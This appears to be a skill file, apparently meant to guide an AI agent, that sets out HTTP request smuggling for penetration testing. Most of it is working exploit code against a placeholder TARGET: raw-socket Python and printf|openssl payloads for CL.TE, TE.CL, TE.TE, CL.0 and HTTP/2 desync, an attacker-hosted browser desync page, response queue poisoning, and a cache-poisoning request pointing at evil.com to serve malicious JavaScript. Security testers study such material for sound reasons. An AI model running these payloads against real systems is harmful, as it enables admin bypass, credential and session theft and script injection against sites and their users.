---
name: http-request-smuggling
description: HTTP request smuggling testing covering CL.TE, TE.CL, TE.TE, CL.0, HTTP/2 desync, browser-powered desync, response queue poisoning, and front-end/back-end splitting attacks
---

# HTTP Request Smuggling — Expert-Level Testing

Request smuggling exploits disagreements between front-end proxies (CDN, load balancer, WAF) and back-end servers on how to parse HTTP request boundaries. This leads to request injection, cache poisoning, credential theft, and WAF bypass.

## Step 1: Detect Proxy Chain

```bash
# Identify front-end proxy/CDN
curl -sI https://TARGET | grep -iE "via|x-cache|cf-cache-status|cf-ray|x-varnish|age|x-served-by|x-cdn|x-amz|fastly|akamai|server"

# Check HTTP/2 support (important for H2 desync attacks)
curl -sI --http2 https://TARGET 2>&1 | head -5

# Check if both CL and TE are accepted simultaneously
curl -sk https://TARGET -H "Transfer-Encoding: chunked" -H "Content-Length: 0" -X POST -d "" -v 2>&1 | grep -i "HTTP/"

# Fingerprint server software
curl -sI https://TARGET | grep -i "^server:"
```

## Step 2: CL.TE Detection and Exploitation

Front-end uses Content-Length, back-end uses Transfer-Encoding.

### Detection

```python
#!/usr/bin/env python3
"""CL.TE request smuggling detector using raw sockets."""
import socket, ssl, time

HOST = "TARGET"
PORT = 443

def send_raw(data):
    sock = socket.create_connection((HOST, PORT), timeout=10)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(sock, server_hostname=HOST)
    sock.sendall(data)
    time.sleep(0.5)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    sock.close()
    return response

# CL.TE detection probe
# Front-end sees CL=6 → reads "0\r\n\r\nG"
# Back-end sees TE=chunked → chunk size 0 = end, "G" is start of NEXT request
probe = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 6\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"0\r\n"
    f"\r\n"
    f"G"
).encode()

print("[*] Sending CL.TE probe...")
resp = send_raw(probe)

# Send a normal follow-up request on the SAME connection
followup = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 0\r\n"
    f"\r\n"
).encode()

resp2 = send_raw(followup)
if b"GPOST" in resp2 or b"405" in resp2 or b"400" in resp2:
    print("[VULN] CL.TE request smuggling detected!")
    print(f"Response: {resp2[:500]}")
else:
    print("[INFO] CL.TE not detected (or different desync type)")
```

### Exploitation — Smuggle Admin Access

```bash
# Using printf + openssl (raw TCP control)
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 71\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: TARGET\r\nFoo: bar\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Smuggle to steal next user's request (credential theft)
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 200\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /store HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 500\r\n\r\nx=' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null
```

## Step 3: TE.CL Detection and Exploitation

Front-end uses Transfer-Encoding, back-end uses Content-Length.

### Detection

```python
#!/usr/bin/env python3
"""TE.CL request smuggling detector."""
import socket, ssl, time

HOST = "TARGET"
PORT = 443

def send_raw(data):
    sock = socket.create_connection((HOST, PORT), timeout=10)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(sock, server_hostname=HOST)
    sock.sendall(data)
    time.sleep(2)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    sock.close()
    return response

# TE.CL detection probe
# Front-end sees TE=chunked → reads entire chunked body
# Back-end sees CL=4 → reads only "5e\r\n", rest is start of NEXT request
probe = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 4\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"5e\r\n"
    f"GPOST / HTTP/1.1\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 15\r\n"
    f"\r\n"
    f"x=1\r\n"
    f"0\r\n"
    f"\r\n"
).encode()

print("[*] Sending TE.CL probe...")
resp = send_raw(probe)
if b"GPOST" in resp or b"405" in resp or b"400" in resp:
    print("[VULN] TE.CL request smuggling detected!")
else:
    print("[INFO] TE.CL not detected")
```

## Step 4: TE.TE with Obfuscation

Both front-end and back-end support Transfer-Encoding, but one can be confused with obfuscation:

```bash
# Obfuscated Transfer-Encoding variants — test ALL of these
# Tab before value
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n0\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Space before colon
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Capitalization
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: Chunked\r\n\r\n0\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# CRLF in header value
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Duplicate TE headers
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Suffix junk
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding: chunkedx\r\n\r\n0\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Newline before chunked
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\nTransfer-Encoding:\n chunked\r\n\r\n0\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null
```

## Step 5: CL.0 / H2.0 (Server-Level Desync — NO Front-End Required)

CL.0 desync occurs when the back-end server IGNORES the Content-Length header entirely on certain endpoints. This means you can include extra data after the intended body, and the server treats it as the start of the next request.

### Detection

```python
#!/usr/bin/env python3
"""CL.0 request smuggling detector.
Finds endpoints where the server ignores Content-Length entirely."""
import socket, ssl, time

HOST = "TARGET"
PORT = 443
# CL.0 typically works on endpoints that don't expect a body:
# - Static file paths: /images/, /static/, /resources/
# - Redirect endpoints
# - Error pages (404)
PATHS_TO_TEST = ["/", "/images/", "/static/", "/resources/", "/favicon.ico", "/robots.txt"]

def send_raw(data):
    sock = socket.create_connection((HOST, PORT), timeout=10)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(sock, server_hostname=HOST)
    sock.sendall(data)
    time.sleep(1)
    response = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    sock.close()
    return response

for path in PATHS_TO_TEST:
    # Send a POST with CL declaring a larger body than sent,
    # with the "extra" data being a smuggled request prefix
    smuggled = f"GET /hopefully404 HTTP/1.1\r\nHos: {HOST}\r\n\r\n"
    body = f"x=1"
    cl = len(body) + len(smuggled)
    
    probe = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"\r\n"
        f"{body}"
        f"{smuggled}"
        # Immediately follow with a normal request on same connection
        f"GET / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()
    
    resp = send_raw(probe)
    # If the second response is for /hopefully404 instead of /, CL.0 confirmed
    if b"404" in resp.split(b"HTTP/1.1")[2:3][0] if len(resp.split(b"HTTP/1.1")) > 2 else False:
        print(f"[VULN] CL.0 desync on {path}!")
    else:
        print(f"[INFO] {path} — no CL.0 desync")
```

## Step 6: HTTP/2 Desync (H2.CL / H2.TE)

When a front-end proxy accepts HTTP/2 and downgrades to HTTP/1.1 for the backend:

```python
#!/usr/bin/env python3
"""HTTP/2 request smuggling via h2 library.
Exploits H2→H1 downgrade at the proxy."""
import h2.connection
import h2.config
import h2.events
import socket, ssl, time

HOST = "TARGET"
PORT = 443

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(['h2'])

sock = socket.create_connection((HOST, PORT), timeout=10)
sock = ctx.wrap_socket(sock, server_hostname=HOST)

# Verify HTTP/2 was negotiated
if sock.selected_alpn_protocol() != 'h2':
    print("[INFO] HTTP/2 not supported, skipping H2 desync")
    exit()

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# H2.CL attack: inject Content-Length header in HTTP/2 request
# Proxy converts to HTTP/1.1 preserving our CL header
smuggled_body = "GET /admin HTTP/1.1\r\nHost: TARGET\r\n\r\n"
real_body = "x=1"
full_body = real_body + smuggled_body

headers = [
    (':method', 'POST'),
    (':path', '/'),
    (':authority', HOST),
    (':scheme', 'https'),
    ('content-type', 'application/x-www-form-urlencoded'),
    ('content-length', str(len(real_body))),  # CL shorter than actual body
]

conn.send_headers(1, headers)
conn.send_data(1, full_body.encode(), end_stream=True)
sock.sendall(conn.data_to_send())

time.sleep(1)
resp = sock.recv(65535)
print(f"Response: {resp[:500]}")
```

## Step 7: Browser-Powered Desync

This attack works from a VICTIM's browser — no direct raw socket access needed. The attacker hosts a page that makes the victim's browser send a desync-inducing request.

### How It Works

1. Victim visits attacker page
2. Attacker's JS makes victim browser send a POST with CL.0 characteristics
3. Victim's browser connection to the target gets desync'd
4. Next request on that connection (potentially to a different origin on same IP) gets poisoned

### Key Requirements

- Target must be on a shared IP or behind a shared reverse proxy
- Target must support CL.0 or similar desync on POST requests
- Victim's browser must reuse the TCP connection

```html
<!-- Host on attacker.com — victim visits this page -->
<script>
    // CL.0 browser-powered desync
    // This sends a POST whose body is longer than the CL,
    // but the browser doesn't enforce CL on fetch() bodies
    fetch('https://TARGET/vulnerable-endpoint', {
        method: 'POST',
        body: "GET /poison HTTP/1.1\r\nHost: TARGET\r\n\r\n",
        mode: 'no-cors',
        credentials: 'include'
    }).then(() => {
        // Follow-up request on reused connection gets the smuggled response
        location = 'https://TARGET/';
    });
</script>
```

## Step 8: Response Queue Poisoning

After confirming a desync, you can poison the response queue so users receive responses meant for the attacker's smuggled requests:

```python
#!/usr/bin/env python3
"""Response queue poisoning via request smuggling.
After desync, the response queue shifts — legitimate users
receive responses to the attacker's smuggled requests."""
import socket, ssl, time

HOST = "TARGET"
PORT = 443

def open_connection():
    sock = socket.create_connection((HOST, PORT), timeout=10)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=HOST)

sock = open_connection()

# Step 1: Send the smuggling request that shifts the response queue
# CL.TE example: smuggle a request to /admin
smuggle = (
    f"POST / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: 53\r\n"
    f"Transfer-Encoding: chunked\r\n"
    f"\r\n"
    f"0\r\n"
    f"\r\n"
    f"GET /admin HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"\r\n"
).encode()

sock.sendall(smuggle)
time.sleep(1)

# Read first response (response to our POST /)
resp1 = sock.recv(65535)
print(f"[*] Response 1 (to our POST): {resp1[:200]}")

# Step 2: Send a normal request on the SAME connection
# This should receive the response to the smuggled GET /admin
normal = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"\r\n"
).encode()

sock.sendall(normal)
time.sleep(1)
resp2 = sock.recv(65535)
print(f"[*] Response 2 (should be /admin): {resp2[:500]}")

if b"admin" in resp2.lower() or b"302" in resp2:
    print("[VULN] Response queue poisoned! Got admin response for normal request!")
sock.close()
```

## Step 9: Smuggling for Cache Poisoning

```bash
# Poison cache by smuggling a request that associates a benign URL with a malicious response
printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 128\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/main.js HTTP/1.1\r\nHost: TARGET\r\nX-Forwarded-Host: evil.com\r\n\r\n' | openssl s_client -connect TARGET:443 -quiet 2>/dev/null

# Next legitimate user requesting /static/main.js gets the poisoned response
# containing resources loaded from evil.com → XSS at scale
```

## Step 10: Automated Detection

```bash
# Using smuggler.py
git clone https://github.com/defparam/smuggler /tmp/smuggler 2>/dev/null
python3 /tmp/smuggler/smuggler.py -u https://TARGET

# Using h2csmuggler for HTTP/2 desync
pip3 install h2 2>/dev/null
git clone https://github.com/BishopFox/h2cSmuggler /tmp/h2csmuggler 2>/dev/null
python3 /tmp/h2csmuggler/h2csmuggler.py -x https://TARGET/ --test

# Manual timing test — fastest confirmation
# Send CL.TE probe, measure if follow-up request hangs (desync = hang)
time printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null
```

## Testing Methodology

1. **Fingerprint proxy chain** — identify CDN/LB (from headers) and back-end server
2. **Test CL.TE** — front-end reads CL, back-end reads TE; send short CL with chunked body
3. **Test TE.CL** — front-end reads TE, back-end reads CL; send chunked with short CL
4. **Test TE.TE obfuscation** — try ALL TE variants (tab, capitalization, duplicates, etc.)
5. **Test CL.0** — find endpoints where server ignores CL entirely (static files, error pages)
6. **Test HTTP/2 desync** — if H2 supported, test H2.CL and H2.TE via h2 library
7. **Confirm with timing** — smuggled requests cause the NEXT request to hang or get wrong response
8. **Exploit** — demonstrate cache poisoning, credential theft, admin access, or response queue poisoning

## Validation

1. Time differential: second request hangs or returns wrong response after smuggle probe
2. Response queue poisoning: normal request receives response for smuggled path
3. Cache poisoning: clean request returns attacker content after smuggling
4. WAF bypass: blocked payload delivered through smuggling

## Impact

- **Critical**: Request injection → access admin panels, bypass WAF, steal credentials
- **Critical**: Cache poisoning → serve malicious JS to all users (XSS at scale)
- **Critical**: Response queue poisoning → steal other users' responses (session tokens, personal data)
- **High**: WAF bypass → deliver blocked payloads past security controls
- **High**: Browser-powered desync → attack other users via their own browser

## Pro Tips

1. **Raw sockets are REQUIRED** — standard HTTP clients (curl, Go http, Python requests) normalize headers and prevent smuggling. Use `printf | openssl s_client` or raw Python sockets.
2. **Timing confirms desync** — send the probe, then immediately send a normal request. If it hangs or errors, desync is confirmed.
3. **CL.TE is most common** — front-end trusts Content-Length, back-end prefers Transfer-Encoding
4. **CL.0 is the newest technique** — server ignores Content-Length on certain paths (static files). No front-end required!
5. **Test ALL TE obfuscation variants** — different servers parse headers differently
6. **HTTP/2 desync is increasingly important** — as H2 adoption grows, H2→H1 downgrade attacks become more common
7. **AWS ALB → EC2** is a known CL.TE vector; **Cloudflare → Apache** is often TE.CL
8. **Response queue poisoning** is the most devastating impact — every subsequent user gets wrong responses
9. **Browser-powered desync** enables attackin from victim's browser — no direct access needed
10. **Always use `Connection: keep-alive`** — smuggling requires connection reuse
